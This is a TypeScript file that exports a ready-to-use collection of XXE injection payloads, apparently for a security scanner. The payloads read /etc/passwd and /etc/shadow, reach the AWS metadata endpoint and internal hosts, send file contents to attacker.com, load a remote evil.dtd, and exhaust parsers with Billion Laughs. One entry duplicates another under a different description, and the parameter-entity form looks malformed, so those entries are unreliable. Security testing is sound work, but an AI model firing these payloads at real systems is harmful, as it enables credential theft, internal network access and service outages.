/**
 * XXE (XML External Entity) Payloads
 * Payloads for testing XML External Entity injection vulnerabilities
 */

export interface XXEPayload {
  payload: string;
  description: string;
  severity: 'critical' | 'high' | 'medium' | 'low';
  attackType: 'file-read' | 'ssrf' | 'dos' | 'blind';
}

export const XXE_PAYLOADS: XXEPayload[] = [
  // Basic file read XXE
  {
    payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>`,
    description: "Basic XXE to read /etc/passwd",
    severity: 'critical',
    attackType: 'file-read',
  },
  {
    payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/shadow">
]>
<foo>&xxe;</foo>`,
    description: "XXE to read /etc/shadow",
    severity: 'critical',
    attackType: 'file-read',
  },
  {
    payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
]>
<foo>&xxe;</foo>`,
    description: "XXE to read Windows hosts file",
    severity: 'critical',
    attackType: 'file-read',
  },
  {
    payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///C:/boot.ini">
]>
<foo>&xxe;</foo>`,
    description: "XXE to read Windows boot.ini",
    severity: 'high',
    attackType: 'file-read',
  },
  
  // SSRF via XXE
  {
    payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<foo>&xxe;</foo>`,
    description: "XXE SSRF to AWS metadata service",
    severity: 'critical',
    attackType: 'ssrf',
  },
  {
    payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">
]>
<foo>&xxe;</foo>`,
    description: "XXE SSRF to localhost",
    severity: 'high',
    attackType: 'ssrf',
  },
  {
    payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://internal-server.local/secret">
]>
<foo>&xxe;</foo>`,
    description: "XXE SSRF to internal network",
    severity: 'critical',
    attackType: 'ssrf',
  },
  {
    payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://attacker.com/">
]>
<foo>&xxe;</foo>`,
    description: "XXE SSRF to external server",
    severity: 'high',
    attackType: 'ssrf',
  },
  
  // Parameter entity XXE
  {
    payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY callhome SYSTEM "http://attacker.com/?%xxe;">
]>
<foo>test</foo>`,
    description: "XXE with parameter entity",
    severity: 'critical',
    attackType: 'file-read',
  },
  {
    payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY callhome SYSTEM "http://attacker.com/?%xxe;">
]>
<foo>test</foo>`,
    description: "XXE parameter entity with external DTD",
    severity: 'critical',
    attackType: 'file-read',
  },
  
  // Blind XXE (out-of-band)
  {
    payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://attacker.com/xxe">
]>
<foo>&xxe;</foo>`,
    description: "Blind XXE to external server",
    severity: 'high',
    attackType: 'blind',
  },
  {
    payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
%xxe;
]>
<foo>test</foo>`,
    description: "Blind XXE with external DTD",
    severity: 'high',
    attackType: 'blind',
  },
  
  // DoS XXE (Billion Laughs)
  {
    payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<foo>&lol9;</foo>`,
    description: "Billion Laughs DoS attack",
    severity: 'high',
    attackType: 'dos',
  },
  {
    payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///dev/random">
]>
<foo>&xxe;</foo>`,
    description: "XXE DoS using /dev/random",
    severity: 'high',
    attackType: 'dos',
  },
  
  // PHP wrapper XXE
  {
    payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<foo>&xxe;</foo>`,
    description: "XXE using PHP filter wrapper",
    severity: 'critical',
    attackType: 'file-read',
  },
  {
    payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/read=string.rot13/resource=index.php">
]>
<foo>&xxe;</foo>`,
    description: "XXE using PHP ROT13 filter",
    severity: 'high',
    attackType: 'file-read',
  },
  
  // UTF-16 encoded XXE
  {
    payload: `<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>`,
    description: "XXE with UTF-16 encoding",
    severity: 'high',
    attackType: 'file-read',
  },
];

/**
 * Get XXE payloads filtered by attack type
 */
export function getXXEPayloads(attackType?: string): XXEPayload[] {
  if (!attackType) {
    return XXE_PAYLOADS;
  }
  return XXE_PAYLOADS.filter(p => p.attackType === attackType);
}

